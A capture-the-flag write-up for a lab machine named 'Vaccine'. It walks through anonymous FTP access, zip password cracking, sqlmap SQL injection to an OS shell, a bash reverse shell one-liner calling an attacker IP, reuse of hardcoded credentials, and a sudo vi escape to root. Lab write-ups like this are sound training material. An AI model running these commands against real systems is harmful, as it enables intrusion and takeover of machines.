# Vaccine

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.230
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     syn-ack OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW12OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=
|   256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MegaCorp Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

ftp access as anonmous get us a `backup.zip`

its password protected lets fire `zip2john`

```
zip2john backup.zip > backup.john
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963 (backup.zip)
1g 0:00:00:01 DONE (2021-10-28 21:38) 0.7936g/s 3250p/s 3250c/s 3250C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed

password = 741852963
```

we get a php and css files
interresting part of the php file

```
session_start();
if(isset($_POST['username']) && isset($\_POST['password'])) {
if($_POST['username'] === 'admin' && md5($\_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
$\_SESSION['login'] = "true";
header("Location: dashboard.php");
//web credentials:
admin:qwerty789
```

After login on website we access dashboard wich is a search page with obvious Sqli vulnerabilities

Today we fire `sqlmap`

We try to directly get shell adding `--os-shell` to command but

```
[22:43:07] [CRITICAL] unable to prompt for an interactive operating system shell via the back-end DBMS because stacked queries SQL injection is not supported
```

ok I tried again with sudo and it worked  
WORKS WITH SUDO

```
└──╼ $sudo sqlmap -u 'http://10.129.149.84/dashboard.php?search=a' --cookie='PHPSESSID=ibubfif67ebkdul9tlg4o9q1f9' --os-shell
---

    ---
    [23:37:25] [INFO] the back-end DBMS is PostgreSQL
    web server operating system: Linux Ubuntu 20.04 or 19.10 (focal or eoan)
    web application technology: Apache 2.4.41
    back-end DBMS: PostgreSQL
    [23:37:26] [INFO] fingerprinting the back-end DBMS operating system
    [23:37:27] [INFO] the back-end DBMS operating system is Linux
    [23:37:27] [INFO] testing if current user is DBA
    [23:37:28] [INFO] retrieved: '1'
    [23:37:28] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
    [23:37:28] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
    os-shell>
```

Or we prepare nc to get a proper shell using a simple command:
`bash -c 'bash -i >& /dev/tcp/10.10.14.230/2311 0>&1'`

And we are in

`postgres@vaccine:/var/lib/postgresql/11/main$`

Exploring the /var/www/html folders we get source code of dashboard.php with hardcoded credentials

```
<?php
session_start();
if($_SESSION['login'] !== "true") {
	header("Location: index.php");
	die();
}
try {
	$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
}

catch ( exception $e ) {
	echo $e->getMessage();
```

so creds are: `postgres:P@s5w0rd!`

The shell kept dying after a timeout we try to spawn a TTY or ssh with the credentials but it still dies

Anyway We get First Flag

```
postgres@vaccine:~$ ls
11 user.txt
postgres@vaccine:~$ cat user.txt
```

time to privEsc

## Priviledge Escalation

sudo -l (password reuse is a thing)

```
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
env*keep+="LANG LANGUAGE LINGUAS LC*\* \_XKB_CHARSET", env_keep+="XAPPLRESDIR
XFILESEARCHPATH XUSERFILESEARCHPATH",
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
mail_badpass

User postgres may run the following commands on vaccine:
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

we can run commands from vi so lets abuse this

we run `sudo vi /etc/postgresql/11/main/pg_hba.conf`

Once in vi just execute

`:!/bin/bash`

And get a root shell

```
root@vaccine:/var/lib/postgresql# cd /root
root@vaccine:~# ls
pg_hba.conf root.txt snap
root@vaccine:~# cat root.txt
```

SECOND FLAG BABY

Found another file in root a postgres auth config file...copied content for later analysis
Might be a way to get a more stable shell

I just understood why the room is called vaccine...we got access via sql injection...lol that took me too long
